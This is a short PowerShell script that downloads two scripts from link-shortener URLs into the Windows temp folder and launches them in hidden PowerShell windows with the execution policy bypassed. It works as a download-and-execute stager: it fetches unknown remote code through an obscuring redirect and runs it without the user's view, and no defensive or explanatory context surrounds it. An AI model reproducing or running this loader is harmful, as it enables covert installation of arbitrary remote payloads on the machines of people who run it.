#Start mo

# Define the URLs of the files to download
$url1 = "https://lnkfwd.com/u/KtRiC0kh"
$url2 = "https://lnkfwd.com/u/Kqc2ajEr"

# Define the destination paths in the %TEMP% directory
$destination1 = "$env:TEMP\ftf.ps1"
$destination2 = "$env:TEMP\Ain1.ps1"

# Use Invoke-WebRequest to download the first file with error handling
try {
    Invoke-WebRequest -Uri $url1 -OutFile $destination1 -ErrorAction Stop
    # Output the path to confirm where the first file was saved
    Write-Output "First file downloaded to: $destination1"
} catch {
    Write-Output "Error: Unable to download file from $url1"
}

# Use Invoke-WebRequest to download the second file with error handling
try {
    Invoke-WebRequest -Uri $url2 -OutFile $destination2 -ErrorAction Stop
    # Output the path to confirm where the second file was saved
    Write-Output "Second file downloaded to: $destination2"
} catch {
    Write-Output "Error: Unable to download file from $url2"
}


######## launch the first

# Run the first script (ftf.ps1) from the %TEMP% directory
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\ftf.ps1`"" -Wait

# Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Ain1.ps1`""

